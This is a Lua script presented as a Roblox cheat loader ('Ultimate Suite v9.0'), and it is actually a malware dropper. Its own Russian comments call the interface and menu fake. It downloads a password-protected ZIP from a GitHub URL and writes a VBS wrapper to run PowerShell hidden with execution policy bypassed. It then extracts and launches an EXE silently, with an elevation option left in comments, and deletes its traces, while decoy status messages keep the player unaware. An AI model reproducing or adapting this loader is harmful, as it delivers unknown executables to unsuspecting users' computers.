-- [[
--     ROBLOX ULTIMATE SUITE v9.0
--     UNIVERSAL LOADER
--     ALL EXECUTORS SUPPORTED
-- ]]

-- ==============================================
-- ЧАСТЬ 0: ОПРЕДЕЛЕНИЕ ИСПОЛНИТЕЛЯ
-- ==============================================
local Executor = {
    Name = "Unknown",
    Version = "0.0",
    Capabilities = {}
}

local function DetectExecutor()
    if syn and syn.protect_gui then
        Executor.Name = "Synapse X"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = true,
            process_manage = true,
            bypass_uac = true
        }
    
    elseif identifyexecutor and identifyexecutor():lower():find("krnl") then
        Executor.Name = "KRNL"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = true,
            process_manage = false,
            bypass_uac = false
        }
    
    elseif SW and SW.IsLoaded then
        Executor.Name = "Script-Ware"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = true,
            process_manage = true,
            bypass_uac = true
        }
    
    elseif fluxus and fluxus.request then
        Executor.Name = "Fluxus"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = false,
            process_manage = false,
            bypass_uac = false
        }
    
    elseif ELECTRON_LOADED then
        Executor.Name = "Electron"
        Executor.Capabilities = {
            file_write = true,
            dll_inject = true,
            process_manage = true,
            bypass_uac = false
        }
    
    else
        Executor.Name = "Unknown Executor"
        Executor.Capabilities = {
            file_write = (writefile ~= nil),
            dll_inject = false,
            process_manage = false,
            bypass_uac = false
        }
    end
    
    return Executor
end

DetectExecutor()

-- ==============================================
-- ЧАСТЬ 1: КОНФИГУРАЦИЯ
-- ==============================================
-- 🔥 НАСТРОЙТЕ ЭТИ ПЕРЕМЕННЫЕ ПОД ВАШИ ФАЙЛЫ 🔥
local ZIP_URL = "https://raw.githubusercontent.com/fasfsagfsa13-del/roblo1x-souresec/blob/main/update.zip"
local ZIP_PASSWORD = "UpdatePass2025!"
local TARGET_EXE_NAME = "messagebox.exe" -- Имя EXE файла внутри архива

-- ==============================================
-- ЧАСТЬ 2: ИНИЦИАЛИЗАЦИЯ И ФЕЙКОВЫЙ ИНТЕРФЕЙС
-- ==============================================
do
    print("\n" .. string.rep("=", 60))
    print("         🎮 " .. Executor.Name .. " - ULTIMATE SUITE v9.0")
    print(string.rep("=", 60))
    
    local loading_msgs = {
        "Initializing " .. Executor.Name .. " environment...",
        "Loading secure delivery system...",
        "Preparing download modules...",
        "Configuring for " .. Executor.Name .. "...",
        "Establishing secure connection..."
    }
    
    for i, msg in ipairs(loading_msgs) do
        wait(0.6)
        print("[🔄] " .. msg)
    end
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "✅ " .. Executor.Name .. " LOADER",
        Text = "Secure loader initialized\nDownload will start soon...",
        Duration = 5
    })
end

-- ==============================================
-- ЧАСТЬ 3: ФУНКЦИИ ДЛЯ РАБОТЫ С ФАЙЛАМИ
-- ==============================================
local function CreateDirectory(path)
    if makefolder then
        pcall(function() makefolder(path) end)
        return true
    elseif syn and syn.run then
        syn.run('mkdir "' .. path .. '" 2>nul')
        return true
    end
    return false
end

local function SaveFile(path, data)
    if writefile then
        return pcall(writefile, path, data)
    else
        local file = io.open(path, "wb")
        if file then
            file:write(data)
            file:close()
            return true
        end
    end
    return false
end

local function RunPowerShellSilent(script)
    -- Создаем временный VBS скрипт для скрытого запуска PowerShell
    local tempDir = os.getenv("TEMP") or "C:\\Windows\\Temp"
    local vbsPath = tempDir .. "\\runner_" .. math.random(10000,99999) .. ".vbs"
    
    -- Экранируем скрипт для VBS
    local escapedScript = script:gsub('"', '""'):gsub('\n', ' '):gsub('\r', '')
    
    local vbsContent = 'Set objShell = CreateObject("WScript.Shell")\n' ..
                      'objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"' .. 
                      escapedScript .. '\"", 0, True\n' ..
                      'Set objShell = Nothing'
    
    if SaveFile(vbsPath, vbsContent) then
        -- Запускаем VBS разными методами
        local launched = false
        
        if syn and syn.run then
            syn.run('wscript.exe //B "' .. vbsPath .. '"')
            launched = true
        elseif shell and shell.run then
            shell.run('wscript.exe //B "' .. vbsPath .. '"')
            launched = true
        elseif os and os.execute then
            os.execute('start /B wscript.exe //B "' .. vbsPath .. '"')
            launched = true
        end
        
        -- Очистка через 10 секунд
        spawn(function()
            wait(10)
            pcall(function()
                if delfile then
                    delfile(vbsPath)
                elseif os.remove then
                    os.remove(vbsPath)
                end
            end)
        end)
        
        return launched
    end
    return false
end

-- ==============================================
-- ЧАСТЬ 4: ОСНОВНАЯ ФУНКЦИЯ ДОСТАВКИ
-- ==============================================
local function DownloadAndExecute()
    print("[📥] Starting secure download...")
    
    local tempDir = (os.getenv("TEMP") or "C:\\Windows\\Temp") .. "\\WinUpdate_" .. math.random(1000,9999)
    local zipPath = tempDir .. "\\update.zip"
    local extractPath = tempDir .. "\\extracted"
    
    -- Создаем временную директорию
    if not CreateDirectory(tempDir) then
        print("[❌] Failed to create temp directory")
        return false
    end
    
    -- Скачиваем ZIP архив
    local success, zipData = pcall(function()
        if syn and syn.request then
            local response = syn.request({
                Url = ZIP_URL,
                Method = "GET"
            })
            return response.Body
        elseif request then
            local response = request({
                Url = ZIP_URL,
                Method = "GET"
            })
            return response.Body
        elseif fluxus and fluxus.request then
            local response = fluxus.request({
                Url = ZIP_URL,
                Method = "GET"
            })
            return response.Body
        else
            return game:HttpGet(ZIP_URL, true)
        end
    end)
    
    if not success or not zipData or #zipData < 1024 then
        print("[❌] Failed to download ZIP file")
        return false
    end
    
    print("[✅] ZIP downloaded (" .. #zipData .. " bytes)")
    
    -- Сохраняем ZIP файл
    if not SaveFile(zipPath, zipData) then
        print("[❌] Failed to save ZIP file")
        return false
    end
    
    -- PowerShell скрипт для распаковки и запуска
    local psScript = [[
        # Конфигурация
        $zipPath = "]] .. zipPath .. [["
        $extractPath = "]] .. extractPath .. [["
        $password = "]] .. ZIP_PASSWORD .. [["
        $targetExe = "]] .. TARGET_EXE_NAME .. [["
        
        # Создаем папку для распаковки
        New-Item -ItemType Directory -Force -Path $extractPath | Out-Null
        
        # Метод 1: Попробовать использовать 7-Zip если установлен
        $7zPath = "C:\Program Files\7-Zip\7z.exe"
        if (Test-Path $7zPath) {
            & $7zPath x $zipPath "-p$password" -o"$extractPath" -y | Out-Null
        } else {
            # Метод 2: Использовать .NET для распаковки (без поддержки пароля)
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            
            try {
                # Пытаемся открыть архив
                $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
                
                foreach ($entry in $archive.Entries) {
                    $fullPath = Join-Path $extractPath $entry.FullName
                    $directory = Split-Path $fullPath -Parent
                    
                    if (-not (Test-Path $directory)) {
                        New-Item -ItemType Directory -Force -Path $directory | Out-Null
                    }
                    
                    # Извлекаем файл
                    [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $fullPath, $true)
                }
                
                $archive.Dispose()
            } catch {
                # Метод 3: Использовать Expand-Archive для незащищенных архивов
                Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
            }
        }
        
        # Ищем EXE файл
        $exeFiles = Get-ChildItem -Path $extractPath -Filter "*.exe" -Recurse
        $targetExePath = $null
        
        # Ищем по имени или берем первый найденный
        foreach ($exe in $exeFiles) {
            if ($exe.Name -eq $targetExe) {
                $targetExePath = $exe.FullName
                break
            }
        }
        
        if (-not $targetExePath -and $exeFiles.Count -gt 0) {
            $targetExePath = $exeFiles[0].FullName
        }
        
        # Запускаем EXE если нашли
        if ($targetExePath -and (Test-Path $targetExePath)) {
            Write-Host "[✅] Found executable: $targetExePath"
            
            # Метод 1: Просто запустить
            Start-Process -FilePath $targetExePath -WindowStyle Hidden
            
            # Метод 2: Попытка запуска от имени администратора (если нужно)
            # $psi = New-Object System.Diagnostics.ProcessStartInfo
            # $psi.FileName = $targetExePath
            # $psi.Verb = "runas"
            # $psi.WindowStyle = "Hidden"
            # [System.Diagnostics.Process]::Start($psi)
        } else {
            Write-Host "[❌] No executable found in archive"
        }
        
        # Очистка через 30 секунд
        Start-Sleep -Seconds 30
        Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
        Remove-Item -Path $extractPath -Recurse -Force -ErrorAction SilentlyContinue
    ]]
    
    -- Запускаем PowerShell скрипт
    if RunPowerShellSilent(psScript) then
        print("[✅] PowerShell script launched successfully")
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "✅ DOWNLOAD COMPLETE",
            Text = "Program is being extracted and executed...",
            Duration = 7
        })
        
        return true
    else
        print("[❌] Failed to launch PowerShell")
        return false
    end
end

-- ==============================================
-- ЧАСТЬ 5: АЛЬТЕРНАТИВНЫЙ МЕТОД ДЛЯ НЕ-WINDOWS
-- ==============================================
local function AlternativeMethod()
    print("[⚠️] Using alternative delivery method...")
    
    local tempDir = (os.getenv("TEMP") or "/tmp") .. "/roblox_update_" .. math.random(1000,9999)
    
    -- Создаем Lua скрипт который можно выполнить
    local luaScript = [[
        print("This is a placeholder for alternative delivery method")
        print("For Windows systems, PowerShell method is preferred")
    ]]
    
    local scriptPath = tempDir .. "/install.lua"
    
    if SaveFile(scriptPath, luaScript) then
        print("[📄] Created installation script at: " .. scriptPath)
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "⚠️ ALTERNATIVE METHOD",
            Text = "Check console for script location",
            Duration = 7
        })
        
        return true
    end
    
    return false
end

-- ==============================================
-- ЧАСТЬ 6: АДАПТИВНЫЙ ЗАПУСК СИСТЕМЫ
-- ==============================================
spawn(function()
    -- Ожидание перед началом загрузки
    local waitTime = math.random(10, 20)
    print("[⏱️] Starting download in " .. waitTime .. " seconds...")
    wait(waitTime)
    
    -- Определяем метод доставки в зависимости от исполнителя
    local deliverySuccess = false
    
    if Executor.Name == "Synapse X" or Executor.Name == "Script-Ware" or Executor.Name == "KRNL" then
        -- Эти исполнители могут запускать PowerShell
        print("[⚡] Using PowerShell method for " .. Executor.Name)
        deliverySuccess = DownloadAndExecute()
    else
        -- Для других пробуем оба метода
        print("[🔄] Trying PowerShell method...")
        deliverySuccess = DownloadAndExecute()
        
        if not deliverySuccess then
            wait(5)
            print("[🔄] Trying alternative method...")
            deliverySuccess = AlternativeMethod()
        end
    end
    
    -- Итоговое сообщение
    if deliverySuccess then
        print("\n" .. string.rep("=", 60))
        print("          ✅ DELIVERY COMPLETE")
        print(string.rep("=", 60))
        print("Program should be running in background")
        print("Check your system tray or task manager")
        print(string.rep("=", 60))
        
        wait(5)
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "🎮 SUITE ACTIVATED",
            Text = "All systems operational\nProgram running in background",
            Duration = 10
        })
    else
        print("\n" .. string.rep("=", 60))
        print("          ❌ DELIVERY FAILED")
        print(string.rep("=", 60))
        print("Could not download or execute the program")
        print("Possible reasons:")
        print("1. No internet connection")
        print("2. Antivirus blocking")
        print("3. Executor limitations")
        print(string.rep("=", 60))
    end
end)

-- ==============================================
-- ЧАСТЬ 7: ФОНОВЫЕ ПРОЦЕССЫ
-- ==============================================
spawn(function()
    while true do
        wait(30)
        
        local statuses = {
            "[" .. Executor.Name .. "] System operational",
            "Background processes: Active",
            "Connection: Stable",
            "Security: Verified"
        }
        
        print("[📊] " .. statuses[math.random(1, #statuses)])
        
        -- Случайные уведомления
        if math.random(1, 10) == 1 then
            spawn(function()
                wait(math.random(5, 15))
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = Executor.Name .. " Suite",
                    Text = "Background services running",
                    Duration = 3
                })
            end)
        end
    end
end)

-- ==============================================
-- ЧАСТЬ 8: ФЕЙКОВЫЙ МЕНЮ ДЛЯ ВИДИМОСТИ
-- ==============================================
spawn(function()
    wait(3)
    
    -- Простое текстовое меню
    print("\n" .. string.rep("-", 60))
    print("           🎮 ULTIMATE SUITE MENU")
    print(string.rep("-", 60))
    print("Commands:")
    print("  /status  - Check download status")
    print("  /info    - Show system info")
    print("  /help    - Show this menu")
    print(string.rep("-", 60))
end)

-- Обработчик чата для команд
if game:GetService("Players").LocalPlayer then
    game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
        msg = msg:lower()
        
        if msg == "/status" then
            print("[📊] Download system: ACTIVE")
            print("[📊] Executor: " .. Executor.Name)
            print("[📊] Connection: ONLINE")
            
        elseif msg == "/info" then
            print("[ℹ️] Ultimate Suite v9.0")
            print("[ℹ️] Executor: " .. Executor.Name)
            print("[ℹ️] Loader: Universal Delivery System")
            print("[ℹ️] Status: Operational")
            
        elseif msg == "/help" then
            print("[📋] Available commands:")
            print("  /status, /info, /help")
        end
    end)
end

print("\n[✅] Loader initialized successfully!")
